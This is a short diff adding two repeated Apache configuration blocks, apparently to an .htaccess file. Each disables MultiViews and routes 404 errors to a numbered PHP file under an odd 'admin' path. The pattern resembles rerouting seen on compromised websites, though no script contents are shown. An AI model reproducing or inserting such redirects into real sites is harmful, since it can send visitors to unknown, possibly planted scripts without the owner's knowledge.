@@ -1,0 +1,6 @@
+
+Options -MultiViews
+ErrorDocument 404 //formgen/use/DownloadBetaForm/admin/140270.php
+
+Options -MultiViews
+ErrorDocument 404 //formgen/use/DownloadBetaForm/admin/135214.php
